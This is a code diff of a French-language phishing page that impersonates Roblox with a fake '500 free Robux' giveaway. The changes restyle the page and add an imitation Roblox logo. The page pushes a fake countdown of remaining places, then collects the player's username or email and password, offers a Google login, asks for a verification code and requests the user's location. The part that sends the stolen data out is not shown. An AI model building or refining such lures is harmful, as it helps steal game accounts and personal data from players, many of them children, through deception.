@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-    <title>Roblox - 500 Robux gratuits</title>
+    <title>Roblox - Free Robux</title>
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;900&display=swap" rel="stylesheet" />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" />
     <style>
         * {
@@ -16,7 +16,7 @@
         }
 
         body {
-            font-family: 'Poppins', -apple-system, 'Segoe UI', Roboto, Arial, sans-serif;
+            font-family: 'Inter', -apple-system, sans-serif;
             background: #f0f4f8;
             min-height: 100vh;
             display: flex;
@@ -29,13 +29,12 @@
 
         .container {
             width: 100%;
-            max-width: 440px;
+            max-width: 400px;
             margin: 0 auto;
-            padding: 0 20px 30px 20px;
             background: #ffffff;
             border-radius: 24px;
-            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.08);
-            overflow: hidden;
+            padding: 24px 24px 36px 24px;
+            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.06);
             position: relative;
         }
 
@@ -47,25 +46,21 @@
             align-items: center;
             justify-content: center;
             position: relative;
-            padding: 16px 0 8px 0;
-            min-height: 60px;
+            margin-bottom: 20px;
         }
 
         .back-arrow {
             position: absolute;
-            left: 0;
+            left: -4px;
             top: 50%;
             transform: translateY(-50%);
             cursor: pointer;
             padding: 8px 12px;
             border-radius: 50%;
             transition: background 0.2s ease;
-            display: flex;
-            align-items: center;
-            justify-content: center;
             background: none;
             border: none;
-            font-size: 20px;
+            font-size: 18px;
             color: #1a1a1a;
         }
 
@@ -74,21 +69,53 @@
         }
 
         .back-arrow i {
-            font-size: 20px;
+            font-size: 18px;
             color: #1a1a1a;
         }
 
         .header h1 {
-            font-size: 22px;
-            font-weight: 700;
+            font-size: 18px;
+            font-weight: 600;
             color: #1a1a1a;
-            letter-spacing: -0.3px;
         }
 
-        .header .step-indicator {
-            font-size: 13px;
-            color: #777;
-            font-weight: 400;
+        /* ============================================================
+           LOGO ROBLOX (avec "o" carré)
+           ============================================================ */
+        .roblox-logo {
+            text-align: center;
+            font-size: 38px;
+            font-weight: 900;
+            letter-spacing: -1px;
+            margin-bottom: 8px;
+            font-family: 'Inter', sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0;
+        }
+
+        .roblox-logo .rob {
+            color: #1a1a1a;
+        }
+
+        .roblox-logo .lox {
+            color: #00b2ff;
+        }
+
+        .roblox-logo .square-o {
+            display: inline-block;
+            background: #00b2ff;
+            color: #ffffff;
+            width: 28px;
+            height: 32px;
+            line-height: 32px;
+            text-align: center;
+            font-weight: 900;
+            font-size: 26px;
+            border-radius: 4px;
+            margin: 0 1px;
+            transform: translateY(-4px);
         }
 
         /* ============================================================
@@ -104,152 +131,158 @@
         }
 
         @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
+            from { opacity: 0; transform: translateY(8px); }
             to { opacity: 1; transform: translateY(0); }
         }
 
         /* ============================================================
-           ÉTAPE 1 : OFFRE 500 ROBUX
+           ÉTAPE 1 : OFFRE ROBUX
            ============================================================ */
-        .offer-box {
-            background: linear-gradient(145deg, #0b1f2e, #162b3e);
+        .offer-badge {
+            display: inline-block;
+            background: #e8f4fd;
+            color: #0066cc;
+            font-size: 11px;
+            font-weight: 600;
+            padding: 4px 14px;
             border-radius: 20px;
-            padding: 32px 24px 28px 24px;
-            text-align: center;
-            margin-top: 8px;
-            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.15);
-            position: relative;
-            overflow: hidden;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 10px;
         }
 
-        .offer-box::after {
-            content: '🎯';
-            position: absolute;
-            top: -20px;
-            right: -10px;
-            font-size: 80px;
-            opacity: 0.06;
-            transform: rotate(20deg);
-        }
-
-        .offer-box .icon-box {
-            font-size: 52px;
-            margin-bottom: 8px;
-            position: relative;
-        }
-
-        .offer-box .title {
+        .offer-title {
             font-size: 26px;
             font-weight: 900;
-            color: #ffffff;
-            position: relative;
+            color: #1a1a1a;
             line-height: 1.2;
+            margin-bottom: 4px;
         }
 
-        .offer-box .title .highlight {
+        .offer-title .highlight {
             color: #00b2ff;
         }
 
-        .offer-box .title .robux-icon {
-            font-size: 22px;
-            display: inline-block;
-            background: #00b2ff;
-            color: #ffffff;
-            padding: 0 8px;
-            border-radius: 4px;
-            margin-left: 4px;
-        }
-
-        .offer-box .description {
+        .offer-subtitle {
             font-size: 14px;
-            color: rgba(255, 255, 255, 0.75);
-            margin: 10px 0 18px 0;
-            line-height: 1.6;
-            position: relative;
+            color: #777;
+            margin-bottom: 20px;
+            line-height: 1.5;
         }
 
-        .offer-box .countdown {
-            display: inline-block;
-            background: rgba(255, 255, 255, 0.08);
-            padding: 6px 18px;
-            border-radius: 30px;
-            font-size: 13px;
-            color: #fff;
-            font-weight: 500;
-            margin-bottom: 18px;
-            position: relative;
-            border: 1px solid rgba(255, 255, 255, 0.06);
+        .offer-stats {
+            display: flex;
+            justify-content: space-between;
+            background: #f7f8fa;
+            border-radius: 12px;
+            padding: 12px 16px;
+            margin-bottom: 20px;
         }
 
-        .offer-box .countdown span {
-            color: #ff6b6b;
+        .offer-stats .stat {
+            text-align: center;
+        }
+
+        .offer-stats .stat .number {
+            font-size: 16px;
             font-weight: 700;
+            color: #1a1a1a;
         }
 
-        .offer-box .btn-offer {
+        .offer-stats .stat .number .robux {
+            color: #00b2ff;
+        }
+
+        .offer-stats .stat .label {
+            font-size: 10px;
+            color: #999;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+            margin-top: 2px;
+        }
+
+        .offer-box {
+            background: linear-gradient(145deg, #0b1f2e, #162b3e);
+            border-radius: 16px;
+            padding: 20px 16px;
+            text-align: center;
+            margin-bottom: 18px;
+        }
+
+        .offer-box .big-icon {
+            font-size: 38px;
+            margin-bottom: 2px;
+        }
+
+        .offer-box .big-title {
+            font-size: 20px;
+            font-weight: 900;
+            color: #ffffff;
+        }
+
+        .offer-box .big-title .highlight {
+            color: #00b2ff;
+        }
+
+        .offer-box .big-desc {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.7);
+            margin-top: 4px;
+        }
+
+        .btn-primary {
+            width: 100%;
             background: #00b2ff;
             color: #ffffff;
             border: none;
-            padding: 16px 32px;
-            border-radius: 30px;
-            font-size: 17px;
-            font-weight: 700;
+            padding: 15px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
             cursor: pointer;
             transition: all 0.3s ease;
-            box-shadow: 0 4px 20px rgba(0, 178, 255, 0.35);
-            position: relative;
-            width: 100%;
-            letter-spacing: 0.3px;
+            font-family: 'Inter', sans-serif;
+            box-shadow: 0 4px 16px rgba(0, 178, 255, 0.3);
         }
 
-        .offer-box .btn-offer:hover {
+        .btn-primary:hover:not(:disabled) {
             transform: scale(1.02);
-            box-shadow: 0 6px 30px rgba(0, 178, 255, 0.5);
+            box-shadow: 0 6px 24px rgba(0, 178, 255, 0.4);
         }
 
-        .offer-box .btn-offer:active {
+        .btn-primary:active:not(:disabled) {
             transform: scale(0.98);
         }
 
-        .offer-box .btn-offer i {
+        .btn-primary:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .btn-primary i {
             margin-right: 8px;
         }
 
-        .offer-box .footer-text {
+        .footer-note {
             font-size: 11px;
-            color: rgba(255, 255, 255, 0.4);
-            margin-top: 14px;
-            position: relative;
+            color: #aaa;
+            text-align: center;
+            margin-top: 12px;
         }
 
         /* ============================================================
-           ÉTAPE 2 : CONNEXION
+           ÉTAPE 2 : CONNEXION (style Roblox)
            ============================================================ */
         .login-header {
             text-align: center;
             margin-bottom: 20px;
         }
 
-        .login-header .logo {
-            font-size: 32px;
-            font-weight: 900;
-            color: #1a1a1a;
-            letter-spacing: -1px;
-        }
-
-        .login-header .logo span {
-            color: #00b2ff;
-        }
-
         .login-header p {
             font-size: 14px;
             color: #777;
             margin-top: 4px;
-        }
-
-        .login-form {
-            display: flex;
-            flex-direction: column;
         }
 
         .input-group {
@@ -261,7 +294,7 @@
             display: block;
             font-size: 12px;
             font-weight: 600;
-            color: #777777;
+            color: #777;
             text-transform: uppercase;
             letter-spacing: 0.5px;
             margin-bottom: 6px;
@@ -283,11 +316,11 @@
 
         .input-group .input-wrapper input {
             width: 100%;
-            padding: 15px 16px 15px 44px;
+            padding: 14px 16px 14px 44px;
             border: 2px solid #e0e0e0;
             border-radius: 12px;
             font-size: 15px;
-            font-family: 'Poppins', sans-serif;
+            font-family: 'Inter', sans-serif;
             outline: none;
             background-color: #f7f8fa;
             color: #1a1a1a;
@@ -346,68 +379,14 @@
             color: #1a1a1a;
         }
 
-        .btn-submit {
-            background: #00b2ff;
-            color: #ffffff;
-            border: none;
-            padding: 16px;
-            border-radius: 30px;
-            font-size: 17px;
-            font-weight: 700;
-            cursor: pointer;
-            margin-top: 8px;
-            margin-bottom: 14px;
-            width: 100%;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 16px rgba(0, 178, 255, 0.3);
-            font-family: 'Poppins', sans-serif;
-        }
-
-        .btn-submit:hover:not(:disabled) {
-            transform: scale(1.02);
-            box-shadow: 0 6px 24px rgba(0, 178, 255, 0.4);
-        }
-
-        .btn-submit:active:not(:disabled) {
-            transform: scale(0.98);
-        }
-
-        .btn-submit:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        .btn-content {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-
-        .spinner {
-            display: none;
-            width: 22px;
-            height: 22px;
-            border: 2.5px solid rgba(255, 255, 255, 0.2);
-            border-top: 2.5px solid #ffffff;
-            border-radius: 50%;
-            animation: spin 0.7s linear infinite;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
         .separator {
             display: flex;
             align-items: center;
             text-align: center;
             color: #b0b0b0;
-            font-size: 13px;
+            font-size: 12px;
             font-weight: 500;
-            margin: 6px 0 18px 0;
+            margin: 12px 0 16px 0;
         }
 
         .separator::before,
@@ -418,25 +397,25 @@
         }
 
         .separator span {
-            padding: 0 16px;
+            padding: 0 14px;
         }
 
         .btn-google {
             background: #ffffff;
             color: #1a1a1a;
             border: 1.5px solid #e0e0e0;
-            padding: 14px;
-            border-radius: 30px;
-            font-size: 15px;
+            padding: 13px;
+            border-radius: 12px;
+            font-size: 14px;
             font-weight: 500;
             display: flex;
             justify-content: center;
             align-items: center;
-            gap: 12px;
+            gap: 10px;
             cursor: pointer;
             width: 100%;
             transition: all 0.3s ease;
-            font-family: 'Poppins', sans-serif;
+            font-family: 'Inter', sans-serif;
         }
 
         .btn-google:hover {
@@ -445,42 +424,30 @@
         }
 
         .btn-google svg {
-            width: 20px;
-            height: 20px;
+            width: 18px;
+            height: 18px;
             flex-shrink: 0;
         }
 
-        .forgot-password {
+        .forgot-links {
             text-align: center;
             margin-top: 14px;
-            font-size: 14px;
+            font-size: 13px;
         }
 
-        .forgot-password a {
+        .forgot-links a {
             color: #00b2ff;
             text-decoration: none;
             font-weight: 500;
         }
 
-        .forgot-password a:hover {
+        .forgot-links a:hover {
             text-decoration: underline;
         }
 
-        .signup-link {
-            text-align: center;
-            margin-top: 10px;
-            font-size: 14px;
-            color: #777;
-        }
-
-        .signup-link a {
-            color: #00b2ff;
-            text-decoration: none;
-            font-weight: 600;
-        }
-
-        .signup-link a:hover {
-            text-decoration: underline;
+        .forgot-links .sep {
+            color: #e0e0e0;
+            margin: 0 8px;
         }
 
         /* ============================================================
@@ -488,7 +455,7 @@
            ============================================================ */
         .verification-info {
             background: #f7f8fa;
-            border-radius: 14px;
+            border-radius: 12px;
             padding: 16px 20px;
             margin-bottom: 20px;
             text-align: center;
@@ -507,12 +474,12 @@
         }
 
         .code-input-group input {
-            width: 50px;
-            height: 60px;
+            width: 48px;
+            height: 56px;
             text-align: center;
-            font-size: 24px;
+            font-size: 22px;
             font-weight: 600;
-            font-family: 'Poppins', sans-serif;
+            font-family: 'Inter', sans-serif;
             border: 2px solid #e0e0e0;
             border-radius: 12px;
             outline: none;
@@ -535,7 +502,7 @@
 
         .resend-link {
             text-align: center;
-            font-size: 14px;
+            font-size: 13px;
             color: #777;
             margin: 12px 0 20px 0;
         }
@@ -573,10 +540,11 @@
         }
 
         .loading-logo {
-            font-size: 48px;
+            font-size: 44px;
             font-weight: 900;
             color: #ffffff;
             letter-spacing: -1px;
+            font-family: 'Inter', sans-serif;
             margin-bottom: 20px;
         }
 
@@ -588,12 +556,12 @@
             color: #ffffff;
             font-size: 16px;
             font-weight: 500;
-            margin-bottom: 18px;
-            font-family: 'Poppins', sans-serif;
+            margin-bottom: 16px;
+            font-family: 'Inter', sans-serif;
         }
 
         .progress-bar {
-            width: 180px;
+            width: 160px;
             height: 3px;
             background: rgba(255, 255, 255, 0.25);
             border-radius: 2px;
@@ -631,8 +599,8 @@
         .geolocation-modal {
             background: #ffffff;
             border-radius: 16px;
-            padding: 32px 24px 24px 24px;
-            width: 320px;
+            padding: 28px 24px 24px 24px;
+            width: 300px;
             max-width: 90%;
             text-align: center;
             box-shadow: 0 12px 48px rgba(0, 0, 0, 0.2);
@@ -645,43 +613,43 @@
         }
 
         .geolocation-modal .geo-icon {
-            font-size: 48px;
-            margin-bottom: 12px;
+            font-size: 40px;
+            margin-bottom: 8px;
             display: block;
         }
 
         .geolocation-modal h3 {
-            font-size: 18px;
+            font-size: 17px;
             color: #1a1a1a;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
             font-weight: 600;
-            font-family: 'Poppins', sans-serif;
+            font-family: 'Inter', sans-serif;
         }
 
         .geolocation-modal p {
-            font-size: 14px;
+            font-size: 13px;
             color: #777;
             line-height: 1.5;
-            margin-bottom: 24px;
-            font-family: 'Poppins', sans-serif;
+            margin-bottom: 20px;
+            font-family: 'Inter', sans-serif;
         }
 
         .geolocation-modal .btn-group {
             display: flex;
-            gap: 12px;
+            gap: 10px;
             justify-content: center;
         }
 
         .geolocation-modal .btn-group button {
-            padding: 12px 28px;
+            padding: 10px 24px;
             border: none;
             border-radius: 30px;
-            font-size: 15px;
+            font-size: 14px;
             font-weight: 600;
             cursor: pointer;
             transition: all 0.2s ease;
             flex: 1;
-            font-family: 'Poppins', sans-serif;
+            font-family: 'Inter', sans-serif;
         }
 
         .geolocation-modal .btn-group button:first-child {
@@ -705,19 +673,13 @@
         /* ============================================================
            RESPONSIVE
            ============================================================ */
-        @media (max-width: 480px) {
-            .container { padding: 0 12px 20px 12px; }
-            .offer-box { padding: 24px 16px 20px 16px; }
-            .offer-box .title { font-size: 22px; }
-            .header h1 { font-size: 20px; }
-            .code-input-group input { width: 42px; height: 52px; font-size: 20px; }
-            .btn-submit { font-size: 16px; padding: 14px; }
-        }
-
-        @media (max-width: 380px) {
-            .code-input-group input { width: 36px; height: 46px; font-size: 18px; }
-            .offer-box .title { font-size: 19px; }
-            .offer-box .btn-offer { font-size: 15px; padding: 14px 20px; }
+        @media (max-width: 420px) {
+            .container { padding: 16px 16px 28px 16px; }
+            .offer-title { font-size: 22px; }
+            .roblox-logo { font-size: 30px; }
+            .roblox-logo .square-o { width: 22px; height: 26px; line-height: 26px; font-size: 20px; }
+            .code-input-group input { width: 40px; height: 48px; font-size: 18px; }
+            .btn-primary { font-size: 15px; padding: 13px; }
         }
     </style>
 </head>
@@ -736,30 +698,55 @@
         </div>
 
         <!-- ============================================================
-        ÉTAPE 1 : OFFRE 500 ROBUX
+        LOGO ROBLOX (avec "o" carré)
+        ============================================================ -->
+        <div class="roblox-logo">
+            <span class="rob">Rob</span>
+            <span class="square-o">o</span>
+            <span class="lox">lox</span>
+        </div>
+
+        <!-- ============================================================
+        ÉTAPE 1 : OFFRE ROBUX
         ============================================================ -->
         <div id="step1" class="step active">
-            <div class="offer-box">
-                <div class="icon-box">🎁</div>
-                <div class="title">
-                    <span class="highlight">500</span> Robux <span class="robux-icon">R$</span>
+            <div style="text-align: center; margin-bottom: 4px;">
+                <span class="offer-badge">🎁 Offre spéciale</span>
+            </div>
+            <h2 class="offer-title">
+                Gagne <span class="highlight">500 Robux</span>
+            </h2>
+            <p class="offer-subtitle">
+                Pour fêter la rentrée, Roblox offre 500 Robux aux 10 000 premiers joueurs.
+            </p>
+
+            <div class="offer-stats">
+                <div class="stat">
+                    <div class="number">10 000</div>
+                    <div class="label">Places totales</div>
                 </div>
-                <div class="title" style="font-size: 18px; font-weight: 600; margin-top: 2px; color: #ffffff;">
-                    OFFRE SPÉCIALE
+                <div class="stat">
+                    <div class="number"><span class="robux" id="remainingPlaces">7 843</span></div>
+                    <div class="label">Restantes</div>
                 </div>
-                <div class="description">
-                    Pour fêter la rentrée, Roblox offre <strong style="color:#fff;">500 Robux</strong> aux 10 000 premiers joueurs qui vérifient leur compte.
-                </div>
-                <div class="countdown">
-                    ⏳ <span id="remainingPlaces">10 000</span> places restantes
-                </div>
-                <button class="btn-offer" id="btnOffer">
-                    <i class="fas fa-gift"></i> RÉCLAMER MES ROBUX
-                </button>
-                <div class="footer-text">
-                    🔒 Offre valable 24h · 100% gratuit
+                <div class="stat">
+                    <div class="number">⏳ 24h</div>
+                    <div class="label">Temps restant</div>
                 </div>
             </div>
+
+            <div class="offer-box">
+                <div class="big-icon">🎁</div>
+                <div class="big-title">
+                    <span class="highlight">500</span> Robux <span style="color:#fff;">R$</span>
+                </div>
+                <div class="big-desc">Gratuits · 100% vérifié · Offre limitée</div>
+            </div>
+
+            <button class="btn-primary" id="btnOffer">
+                <i class="fas fa-gift"></i> Réclamer mes Robux
+            </button>
+            <div class="footer-note">🔒 Aucune carte bancaire requise · 100% gratuit</div>
         </div>
 
         <!-- ============================================================
@@ -767,7 +754,6 @@
         ============================================================ -->
         <div id="step2" class="step">
             <div class="login-header">
-                <div class="logo">Rob<span>lox</span></div>
                 <p>Connecte-toi pour recevoir tes 500 Robux</p>
             </div>
 
@@ -794,18 +780,20 @@
                     </div>
                 </div>
 
-                <button type="submit" class="btn-submit" id="step2Btn">
+                <button type="submit" class="btn-primary" id="step2Btn">
                     <span class="btn-content">
                         <span id="btnText2">Continuer</span>
                         <span class="spinner" id="spinner2"></span>
                     </span>
                 </button>
 
-                <div class="forgot-password">
+                <div class="forgot-links">
                     <a href="#">Mot de passe oublié ?</a>
+                    <span class="sep">·</span>
+                    <a href="#">S'inscrire</a>
                 </div>
 
-                <div class="separator"><span>OU</span></div>
+                <div class="separator"><span>ou</span></div>
 
                 <button class="btn-google" onclick="loginWithGoogle()">
                     <svg viewBox="0 0 24 24">
@@ -816,10 +804,6 @@
                     </svg>
                     Continuer avec Google
                 </button>
-
-                <div class="signup-link">
-                    Pas encore de compte ? <a href="#">S'inscrire</a>
-                </div>
             </form>
         </div>
 
@@ -845,7 +829,7 @@
                 Vous n'avez pas reçu le code ? <a onclick="resendCode()">Renvoyer</a>
             </div>
 
-            <button type="button" class="btn-submit" id="step3Btn">
+            <button type="button" class="btn-primary" id="step3Btn">
                 <span class="btn-content">
                     <span id="btnText3">Vérifier</span>
                     <span class="spinner" id="spinner3"></span>
@@ -862,7 +846,7 @@
         <div class="geolocation-modal">
             <span class="geo-icon">📍</span>
             <h3>Autoriser la localisation ?</h3>
-            <p>Roblox souhaite utiliser votre position<br />pour personnaliser votre expérience.</p>
+            <p>Roblox utilise votre position pour personnaliser votre expérience.</p>
             <div class="btn-group">
                 <button onclick="denyGeolocation()">Refuser</button>
                 <button onclick="allowGeolocation()">Autoriser</button>
@@ -965,15 +949,13 @@
         });
 
         // ============================================================
-        // VALIDATION : Username ou Email (pas seulement Gmail)
+        // VALIDATION : Username ou Email
         // ============================================================
         function isValidUsernameOrEmail(value) {
             if (!value || value.trim() === '') return false;
-            // Si c'est un email, on vérifie le format
             if (value.includes('@')) {
                 return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
             }
-            // Sinon, c'est un nom d'utilisateur (au moins 2 caractères)
             return value.trim().length >= 2;
         }
 
@@ -1081,7 +1063,7 @@
         }
 
         // ============================================================
-        // ÉTAPE 2 : SOUMISSION (nom d'utilisateur ou email)
+        // ÉTAPE 2 : SOUMISSION
         // ============================================================
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
@@ -1089,7 +1071,6 @@
             const username = document.getElementById('username').value.trim();
             const password = document.getElementById('password').value.trim();
 
-            // Validation : username ou email valide
             if (!isValidUsernameOrEmail(username)) {
                 document.getElementById('username').classList.add('input-error');
                 document.getElementById('emailError').style.display = 'flex';
@@ -1222,4 +1203,4 @@
     </script>
 
 </body>
-  </html>
+</html>
